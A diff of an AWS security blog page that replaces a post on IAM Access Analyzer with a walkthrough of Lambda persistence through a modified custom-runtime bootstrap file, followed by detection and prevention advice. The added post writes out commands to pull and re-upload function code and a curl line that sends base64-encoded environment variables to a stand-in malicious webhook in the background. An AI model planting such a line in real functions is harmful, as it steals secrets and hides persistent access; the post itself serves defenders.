@@ -12,13 +12,11 @@
         <meta name="author" content="Sergio Jimenez">
       
       
-        <link rel="canonical" href="https://sjimnar.github.io/blog/2025/06/25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/">
+        <link rel="canonical" href="https://sjimnar.github.io/blog/2025/07/11/unmasking-lambdas-hidden-threat---when-your-bootstrap-becomes-a-backdoor/">
       
       
-        <link rel="prev" href="../defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/">
+        <link rel="prev" href="../../../06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/">
       
-      
-        <link rel="next" href="../../27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/">
       
       
       <link rel="icon" href="../../../../../assets/images/favicon.png">
@@ -26,7 +24,7 @@
     
     
       
-        <title>IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets - aws! security blog</title>
+        <title>Unmasking Lambda's Hidden Threat - When Your Bootstrap Becomes a Backdoor - aws! security blog</title>
       
     
     
@@ -71,11 +69,11 @@
       
         <meta  property="og:type"  content="website" >
       
-        <meta  property="og:title"  content="IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets - aws! security blog" >
+        <meta  property="og:title"  content="Unmasking Lambda's Hidden Threat - When Your Bootstrap Becomes a Backdoor - aws! security blog" >
       
         <meta  property="og:description"  content="A blog about AWS security" >
       
-        <meta  property="og:image"  content="https://sjimnar.github.io/assets/images/social/blog/posts/s3-iam-access-analyzer.png" >
+        <meta  property="og:image"  content="https://sjimnar.github.io/assets/images/social/blog/posts/unmasking-lambda.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -83,15 +81,15 @@
       
         <meta  property="og:image:height"  content="630" >
       
-        <meta  property="og:url"  content="https://sjimnar.github.io/blog/2025/06/25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/" >
+        <meta  property="og:url"  content="https://sjimnar.github.io/blog/2025/07/11/unmasking-lambdas-hidden-threat---when-your-bootstrap-becomes-a-backdoor/" >
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
-        <meta  name="twitter:title"  content="IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets - aws! security blog" >
+        <meta  name="twitter:title"  content="Unmasking Lambda's Hidden Threat - When Your Bootstrap Becomes a Backdoor - aws! security blog" >
       
         <meta  name="twitter:description"  content="A blog about AWS security" >
       
-        <meta  name="twitter:image"  content="https://sjimnar.github.io/assets/images/social/blog/posts/s3-iam-access-analyzer.png" >
+        <meta  name="twitter:image"  content="https://sjimnar.github.io/assets/images/social/blog/posts/unmasking-lambda.png" >
       
     
     
@@ -114,7 +112,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#why-iam-access-analyzer-is-crucial-for-s3" class="md-skip">
+        <a href="#unmasking-lambdas-hidden-threat-when-your-bootstrap-becomes-a-backdoor" class="md-skip">
           Skip to content
         </a>
       
@@ -149,7 +147,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets
+              Unmasking Lambda's Hidden Threat - When Your Bootstrap Becomes a Backdoor
             
           </span>
         </div>
@@ -367,30 +365,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../../06/25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/" class="md-nav__link">
         
   
   
@@ -401,60 +379,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#why-iam-access-analyzer-is-crucial-for-s3" class="md-nav__link">
-    <span class="md-ellipsis">
-      Why IAM Access Analyzer is Crucial for S3
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#how-external-access-detection-works" class="md-nav__link">
-    <span class="md-ellipsis">
-      How External Access Detection Works
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#example-scenario-the-backdoor-policy" class="md-nav__link">
-    <span class="md-ellipsis">
-      Example Scenario: The Backdoor Policy
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#how-to-enable-and-use-iam-access-analyzer" class="md-nav__link">
-    <span class="md-ellipsis">
-      How to Enable and Use IAM Access Analyzer
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -467,7 +391,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/" class="md-nav__link">
+      <a href="../../../06/25/defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/" class="md-nav__link">
         
   
   
@@ -490,7 +414,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../24/s3-ransomware-batch-deletion-attack/" class="md-nav__link">
+      <a href="../../../06/24/s3-ransomware-batch-deletion-attack/" class="md-nav__link">
         
   
   
@@ -513,7 +437,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/" class="md-nav__link">
+      <a href="../../../06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/" class="md-nav__link">
         
   
   
@@ -533,10 +457,30 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../../07/11/unmasking-lambdas-hidden-threat---when-your-bootstrap-becomes-a-backdoor/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Unmasking Lambda's Hidden Threat - When Your Bootstrap Becomes a Backdoor
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -547,6 +491,75 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#unmasking-lambdas-hidden-threat-when-your-bootstrap-becomes-a-backdoor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Unmasking Lambda's Hidden Threat: When Your Bootstrap Becomes a Backdoor
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Unmasking Lambda&#39;s Hidden Threat: When Your Bootstrap Becomes a Backdoor">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-the-bootstrap-understanding-the-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why the Bootstrap? Understanding the Context
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-attack-in-detail-simulating-persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Attack in Detail: Simulating Persistence
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#implications-and-comparison-with-other-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Implications and Comparison with Other Techniques
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fortifying-your-defenses-prevention-and-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fortifying Your Defenses: Prevention and Detection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -608,38 +621,53 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#why-iam-access-analyzer-is-crucial-for-s3" class="md-nav__link">
+  <a href="#unmasking-lambdas-hidden-threat-when-your-bootstrap-becomes-a-backdoor" class="md-nav__link">
     <span class="md-ellipsis">
-      Why IAM Access Analyzer is Crucial for S3
+      Unmasking Lambda's Hidden Threat: When Your Bootstrap Becomes a Backdoor
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Unmasking Lambda&#39;s Hidden Threat: When Your Bootstrap Becomes a Backdoor">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-the-bootstrap-understanding-the-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why the Bootstrap? Understanding the Context
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#how-external-access-detection-works" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#the-attack-in-detail-simulating-persistence" class="md-nav__link">
     <span class="md-ellipsis">
-      How External Access Detection Works
+      The Attack in Detail: Simulating Persistence
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#example-scenario-the-backdoor-policy" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#implications-and-comparison-with-other-techniques" class="md-nav__link">
     <span class="md-ellipsis">
-      Example Scenario: The Backdoor Policy
+      Implications and Comparison with Other Techniques
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#how-to-enable-and-use-iam-access-analyzer" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#fortifying-your-defenses-prevention-and-detection" class="md-nav__link">
     <span class="md-ellipsis">
-      How to Enable and Use IAM Access Analyzer
+      Fortifying Your Defenses: Prevention and Detection
     </span>
   </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -668,6 +696,40 @@
               </div>
             </div>
             
+              <div class="md-post__authors md-typeset">
+                
+                  <div class="md-profile md-post__profile">
+                    <span class="md-author md-author--long">
+                      <img src="../../../../../assets/images/sergio.jpg" alt="Sergio Jimenez">
+                    </span>
+                    <span class="md-profile__description">
+                      <strong>
+                        
+                          <a href="https://www.linkedin.com/in/sjnar/">Sergio Jimenez</a>
+                        
+                      </strong>
+                      <br>
+                      Security Engineer and AWS enthusiast.
+                    </span>
+                  </div>
+                
+                  <div class="md-profile md-post__profile">
+                    <span class="md-author md-author--long">
+                      <img src="../../../../../assets/images/guillermo.jpg" alt="Guillermo Gonzalez">
+                    </span>
+                    <span class="md-profile__description">
+                      <strong>
+                        
+                          <a href="https://www.linkedin.com/in/gfernandezcano/">Guillermo Gonzalez</a>
+                        
+                      </strong>
+                      <br>
+                      Cloud Security Engineer and AWS enthusiast.
+                    </span>
+                  </div>
+                
+              </div>
+            
             <ul class="md-post__meta md-nav__list">
               <li class="md-nav__item md-nav__item--section">
                 <div class="md-post__title">
@@ -680,10 +742,23 @@
                     <li class="md-nav__item">
                       <div class="md-nav__link">
                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
-                        <time datetime="2025-06-25 00:00:00+00:00" class="md-ellipsis">June 25, 2025</time>
+                        <time datetime="2025-07-11 00:00:00+00:00" class="md-ellipsis">July 11, 2025</time>
                       </div>
                     </li>
                     
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../../../../category/aws-security/">AWS Security</a>, 
+                              <a href="../../../../category/serverless---cloud-hacking/">Serverless - Cloud Hacking</a>, 
+                              <a href="../../../../category/persistence/">Persistence</a>, 
+                              <a href="../../../../category/lambda/">Lambda</a></span>
+                        </div>
+                      </li>
                     
                     
                       
@@ -692,7 +767,7 @@
                           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
                           <span class="md-ellipsis">
                             
-                              3 min read
+                              5 min read
                             
                           </span>
                         </div>
@@ -719,56 +794,91 @@
   
 
 
-  <h1>IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets</h1>
+  <h1>Unmasking Lambda's Hidden Threat - When Your Bootstrap Becomes a Backdoor</h1>
 
-<p align="center">
-  <img src="/../assets/images/iam-access-analyzer.png" alt="IAM Access Analyzer" width="700"/>
-</p>
-
-<p>In the vast and ever-expanding AWS ecosystem, permission management is crucial. A simple misconfiguration in an S3 bucket policy can expose sensitive data, opening a backdoor for attackers. This is where IAM Access Analyzer steps in, acting as an unyielding sentinel to protect your resources by detecting unwanted external access.</p>
-<h2 id="why-iam-access-analyzer-is-crucial-for-s3">Why IAM Access Analyzer is Crucial for S3</h2>
-<p>Imagine you've set up an S3 bucket to store critical information. Unbeknownst to you, a poorly configured policy could grant access to an external AWS account or, worse yet, make the bucket publicly accessible. While GuardDuty excels at detecting attack patterns and anomalous activities, and CloudTrail logs all actions, IAM Access Analyzer specializes in the proactive detection of risky policy configurations.</p>
-<p>For instance, GuardDuty might not alert you about a policy granting access to a specific AWS account (as it's not "anonymous" or "public" access in the strict sense that GuardDuty looks for with certain detections). However, Access Analyzer will. Its primary goal is to identify resources accessible from outside your "zone of trust," which includes AWS accounts external to your organization.</p>
-<h2 id="how-external-access-detection-works">How External Access Detection Works</h2>
-<p>IAM Access Analyzer uses logical reasoning to analyze the policies of your resources, including S3 buckets. When you enable it in a region, you define your account or organization as your "zone of trust." It then evaluates all resource policies, searching for any statement that grants permissions to entities outside that zone of trust.</p>
-<p>When IAM Access Analyzer detects a policy that allows an external entity to perform actions on your S3 buckets, it generates a finding. These findings alert you to potential access and provide details like:</p>
+<h2 id="unmasking-lambdas-hidden-threat-when-your-bootstrap-becomes-a-backdoor">Unmasking Lambda's Hidden Threat: When Your Bootstrap Becomes a Backdoor</h2>
+<p>So, you've jumped on the serverless bandwagon, huh? All that auto-scaling, no servers to patch, just pure code magic. It feels invincible, right? Well, sorry to burst your bubble, but even in the land of ephemeral functions, bad actors are finding ways to stick around longer than an awkward family dinner. Today, we're pulling back the curtain on one of those particularly sneaky tricks: achieving persistence in AWS Lambda by messing with its very heart – the custom runtime <code>bootstrap</code> file.</p>
+<h3 id="why-the-bootstrap-understanding-the-context">Why the Bootstrap? Understanding the Context</h3>
+<p>AWS Lambda allows developers to use custom runtimes. This is made possible by the <strong>Lambda Runtime API</strong> and a key executable: the <code>bootstrap</code> file. When a Lambda function with a custom runtime is invoked, AWS calls this <code>bootstrap</code> file. Its purpose is to initialize the runtime environment, load the function's code and manage the lifecycle of invocations, directly interacting with the Runtime API to send and receive events.</p>
+<p>Herein lies the opportunity for an attacker: if a function with a custom runtime is compromised and sufficient permissions are obtained, modifying this <code>bootstrap</code> allows malicious code to be injected. This code will execute <em>before</em> the legitimate function code on every invocation, ensuring stealthy persistence, even if the main function's code is subsequently updated.</p>
+<h3 id="the-attack-in-detail-simulating-persistence">The Attack in Detail: Simulating Persistence</h3>
+<p>Simulating this attack requires initial access to the compromised Lambda function and permissions to modify its code.</p>
+<p><strong>Prerequisites:</strong></p>
 <ul>
-<li><strong>Finding type</strong>: For example, public access or cross-account access.</li>
-<li><strong>Affected resource</strong>: The S3 bucket's ARN.</li>
-<li><strong>Allowed action</strong>: The S3 operations the external entity can perform (e.g., <code>s3:GetObject</code>, <code>s3:ListBucket</code>).</li>
-<li><strong>External principal</strong>: The identity (an AWS account, an IAM user, a role, etc.) that has access.</li>
+<li>An existing Lambda function with a <strong>custom runtime</strong>.</li>
+<li>IAM permissions for <code>lambda:UpdateFunctionCode</code>.</li>
+<li>Ability to write to <code>/tmp</code> or <code>/var/task</code> (though direct <code>bootstrap</code> modification is more direct).</li>
+<li>A webhook for exfiltration (e.g., <code>webhook.site</code>).</li>
 </ul>
-<p>This is incredibly valuable because it lets you identify and remediate security configurations before they can be exploited.</p>
-<h2 id="example-scenario-the-backdoor-policy">Example Scenario: The Backdoor Policy</h2>
-<p>Consider the following example of an S3 bucket policy that could be used as a "backdoor" to exfiltrate data:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">{</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="nt">&quot;Version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2012-10-17&quot;</span><span class="p">,</span>
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nt">&quot;Statement&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">        </span><span class="p">{</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">            </span><span class="nt">&quot;Effect&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Allow&quot;</span><span class="p">,</span>
-<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">            </span><span class="nt">&quot;Principal&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">                </span><span class="nt">&quot;AWS&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;arn:aws:iam::193672423079:root&quot;</span>
-<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">            </span><span class="p">},</span>
-<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">            </span><span class="nt">&quot;Action&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">                </span><span class="s2">&quot;s3:GetObject&quot;</span><span class="p">,</span>
-<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">                </span><span class="s2">&quot;s3:GetBucketLocation&quot;</span><span class="p">,</span>
-<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">                </span><span class="s2">&quot;s3:ListBucket&quot;</span>
-<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">            </span><span class="p">],</span>
-<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">            </span><span class="nt">&quot;Resource&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">                </span><span class="s2">&quot;arn:aws:s3:::my-secret-bucket/*&quot;</span><span class="p">,</span>
-<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">                </span><span class="s2">&quot;arn:aws:s3:::my-secret-bucket&quot;</span>
-<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">            </span><span class="p">]</span>
-<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="w">        </span><span class="p">}</span>
-<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">    </span><span class="p">]</span>
-<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="p">}</span>
+<p><strong>Simulation Steps:</strong></p>
+<ol>
+<li>
+<p><strong>Download the current function:</strong>
+    The first step is to get the function's code. This can be done using <code>aws lambda get-function --function-name your-function-name --query 'Code.Location'</code> to get the ZIP package URL, then downloading it.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>aws<span class="w"> </span>lambda<span class="w"> </span>get-function<span class="w"> </span>--function-name<span class="w"> </span>my-affected-function<span class="w"> </span>--query<span class="w"> </span><span class="s1">&#39;Code.Location&#39;</span><span class="w"> </span>--output<span class="w"> </span>text<span class="w"> </span>&gt;<span class="w"> </span>code_location.txt
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>wget<span class="w"> </span>-O<span class="w"> </span><span class="k">function</span>.zip<span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>code_location.txt<span class="k">)</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>unzip<span class="w"> </span><span class="k">function</span>.zip<span class="w"> </span>-d<span class="w"> </span>extracted_function
 </code></pre></div>
-<p>This policy allows the root AWS account with ID 193672423079 to access <code>my-secret-bucket</code>. If this account isn't part of your organization, IAM Access Analyzer will generate a finding, as it will detect this cross-account access as a potential vulnerability. It will notify you that your bucket has a policy allowing an external entity to access its content, enabling you to take immediate action.</p>
-<h2 id="how-to-enable-and-use-iam-access-analyzer">How to Enable and Use IAM Access Analyzer</h2>
+</li>
+<li>
+<p><strong>Edit the <code>bootstrap</code>:</strong>
+    Inside the <code>extracted_function</code> directory, locate the <code>bootstrap</code> file. Add a malicious line to the beginning of this file. For example, to exfiltrate environment variables to your webhook:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Add this line to the beginning of the &#39;extracted_function/bootstrap&#39; file</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>env<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">[</span>https://your-malicious-webhook.site/path<span class="o">](</span>https://your-malicious-webhook.site/path<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span>
+</code></pre></div>
+The <code>&amp;</code> at the end is crucial for the command to execute in the background and not block the runtime's startup, allowing the legitimate function to run without obvious interruptions for the user or application.</p>
+</li>
+<li>
+<p><strong>Upload the changes:</strong>
+    Repackage the function and upload it to AWS.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>zip<span class="w"> </span>-r<span class="w"> </span>new_function.zip<span class="w"> </span>extracted_function/
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>aws<span class="w"> </span>lambda<span class="w"> </span>update-function-code<span class="w"> </span>--function-name<span class="w"> </span>my-affected-function<span class="w"> </span>--zip-file<span class="w"> </span>fileb://new_function.zip
+</code></pre></div>
+</li>
+</ol>
+<p>Once the function is invoked, the malicious <code>bootstrap</code> will execute, sending the desired information to your webhook, all while the original function proceeds normally.</p>
+<h3 id="implications-and-comparison-with-other-techniques">Implications and Comparison with Other Techniques</h3>
+<p>This technique is particularly stealthy because the <code>bootstrap</code> is a fundamental file for the runtime, and its modification can go unnoticed if not explicitly audited. Unlike simply modifying the function code (which could be overwritten by a legitimate deployment), the <code>bootstrap</code> change persists through updates to the main function's code, as the <code>bootstrap</code> is part of the runtime environment, not the application code.</p>
+<p>Other Lambda persistence techniques include:
+* <strong>Backdooring existing runtimes (e.g., Python/Node.js):</strong> Modifying standard libraries or modules so that malicious code executes when the function imports them.
+* <strong>"Runtime Swapping":</strong> Changing an existing function's runtime to a custom one controlled by the attacker.
+* <strong>Malicious Layers:</strong> If an attacker can create or modify a Lambda Layer used by a target function, they can inject compromised code or dependencies.</p>
+<p>The <code>bootstrap</code> attack stands out for its subtlety and ability to survive legitimate code deployments, making it an advanced and dangerous technique.</p>
+<h3 id="fortifying-your-defenses-prevention-and-detection">Fortifying Your Defenses: Prevention and Detection</h3>
+<p>Detecting and preventing these types of attacks requires a multifaceted and proactive approach to serverless security.</p>
+<ol>
+<li>
+<p><strong>Continuous Detection and Monitoring (Runtime and Behavior):</strong></p>
 <ul>
-<li><strong>Enablement</strong>: Go to the AWS IAM console, navigate to Access Analyzer, and enable it for the region where your S3 buckets are located. You can choose to analyze your current account or your entire AWS organization.</li>
-<li><strong>Finding Review</strong>: Once enabled, Access Analyzer will begin scanning your resources. Findings will appear in the Access Analyzer dashboard. Review them regularly.</li>
-<li><strong>Action</strong>: For each finding, determine if the access is intended and secure. If not, modify the bucket policy to revoke the unwanted access. IAM Access Analyzer even helps you generate a secure policy to fix the issue.</li>
+<li><strong>Amazon CloudTrail:</strong> Monitor and alert on critical events such as <code>UpdateFunctionCode</code>, <code>CreateFunction</code>, <code>CreateFunctionUrlConfig</code>, and <code>UpdateFunctionConfiguration</code>. Set up Amazon EventBridge alarms for immediate notifications of any unexpected function modifications.</li>
+<li><strong>Amazon GuardDuty &amp; AWS Security Hub:</strong> Enable these services. GuardDuty can detect anomalous behavior, such as unusual outbound connections to suspicious domains from a Lambda function that normally shouldn't communicate externally. Security Hub consolidates findings and offers centralized visibility.</li>
+<li><strong>Runtime Security:</strong> Implement third-party solutions like Sysdig, Upwind, Palo Alto Networks Prisma Cloud, Aqua Security, or Lacework. These tools can detect command injections, runtime file modifications (<code>bootstrap</code>), or anomalous processes within the Lambda environment.</li>
 </ul>
+</li>
+<li>
+<p><strong><code>bootstrap</code> Content Review:</strong></p>
+<ul>
+<li><strong>Manual and Automated Auditing:</strong> For functions with custom runtimes, the <code>bootstrap</code> file must be rigorously audited. Integrate validations in your CI/CD pipelines that block deployments with suspicious commands (e.g., <code>curl</code>, <code>nc</code>, <code>wget</code>) or unauthorized changes in the <code>bootstrap</code>.</li>
+<li><strong>Hash Monitoring:</strong> Use <code>aws lambda get-function --query 'Configuration.CodeSha256'</code> to get the ZIP code hash. Store and monitor these hashes to detect any unexpected changes in the function's deployment package.</li>
+</ul>
+</li>
+<li>
+<p><strong>Supply Chain Security:</strong></p>
+<ul>
+<li><strong>Code Signing:</strong> AWS Lambda supports code signing. Enable this feature to ensure that only code packages signed by trusted entities can be deployed to your functions. This would thwart any attempt to deploy a modified <code>bootstrap</code> without the proper signature.</li>
+<li><strong>Container Image Scanning:</strong> If you use container images as a runtime for Lambda, integrate Amazon Inspector or third-party tools into your pipeline to continuously scan images for vulnerabilities and malicious content, including <code>bootstrap</code> modifications.</li>
+</ul>
+</li>
+<li>
+<p><strong>Least Privilege and Isolation Principles:</strong></p>
+<ul>
+<li><strong>IAM Least Privilege:</strong> Ensure that Lambda deployment IAM roles (<code>lambda:UpdateFunctionCode</code>) and execution roles (<code>lambda:InvokeFunction</code>) have only the strictly necessary permissions. Avoid granting excessive permissions that could be exploited.</li>
+<li><strong>Network Restrictions (VPC):</strong> Place critical Lambda functions within an Amazon VPC. If a function does not require internet access, avoid configuring a NAT Gateway. This drastically restricts an attacker's ability to exfiltrate data to external webhooks.</li>
+</ul>
+</li>
+</ol>
+<hr />
+<p>The world of serverless security is always evolving, and as defenders, so must we. Understanding how seemingly benign components like the <code>bootstrap</code> can be weaponized is key to staying ahead. Keep your eyes peeled, your CloudTrails flowing, and your security tools sharp. The cloud might feel like magic, but even magic has its dark corners – it's up to us to shine a light on them.</p>
 
 
 
@@ -857,7 +967,7 @@
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Defending S3 - Anatomy and Countermeasures for Encryption and Deletion Attacks (Codefinger ransomware)">
+          <a href="../../../06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Stealthy Persistence in AWS - A Practical Simulation for Defenders">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
@@ -867,27 +977,11 @@
                 Previous
               </span>
               <div class="md-ellipsis">
-                Defending S3 - Anatomy and Countermeasures for Encryption and Deletion Attacks (Codefinger ransomware)
-              </div>
-            </div>
-          </a>
-        
-        
-          
-          <a href="../../27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/" class="md-footer__link md-footer__link--next" aria-label="Next: Stealthy Persistence in AWS - A Practical Simulation for Defenders">
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              <div class="md-ellipsis">
                 Stealthy Persistence in AWS - A Practical Simulation for Defenders
               </div>
             </div>
-            <div class="md-footer__button md-icon">
-              
